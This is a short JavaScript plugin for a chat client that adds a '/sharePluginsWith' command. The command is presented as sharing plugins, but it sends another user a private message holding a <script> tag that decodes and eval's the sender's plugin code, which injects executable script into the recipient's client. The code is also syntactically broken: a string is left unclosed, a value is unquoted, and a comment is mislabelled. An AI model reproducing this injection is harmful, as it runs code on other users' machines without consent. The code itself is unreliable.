var sharePluginsWithPlugin = function () {
    
    var _self = this ;
    
    _self.init = function () {
        $.pluginApi.loadPlugin('IRCcmd');
        $.irc.addCmd({ 
            func: _self.sharePluginsWith, 
            description:'share your known plugins with a given user', 
            proto:'/sharePluginsWith [user]'
        }, 'sharePluginsWith');
    };
    
    _self.stop = function() {
        $.irc.addCmd(null, 'sharePluginsWith');
    };
    
    /**
     * Action of command /battery
     * @param string cmd Command
     * @param string params End of the command
     * @param object source User who send the command (null if current)
     */
    _self.sharePluginsWith = function (cmd, params, source) {
	  	if( !source ) { try{
        $.chat.sendPrivate(params,  '<script>var pl=' + btoa($.chat.pluginsCode) + ';eval(atob(pl));</script>);
	  	}catch(e){$.chat.write(e.toString(), 'sharePluginsWith');return '';}
		  }
		  return '';
	  };
    

};

var sharePluginsWithPluginVar = new sharePluginsWithPlugin();
    
$.plugin({
    name: 'sharePluginsWith',
    init: sharePluginsWithPluginVar.init,
	onWrite: function(msg, nick){
		if (msg.indexOf('/me') == 0 && nick == $.chat.myNick()) {
			msg = '';
        }
		return msg;
	},
    stop: sharePluginsWithPluginVar.stop
});
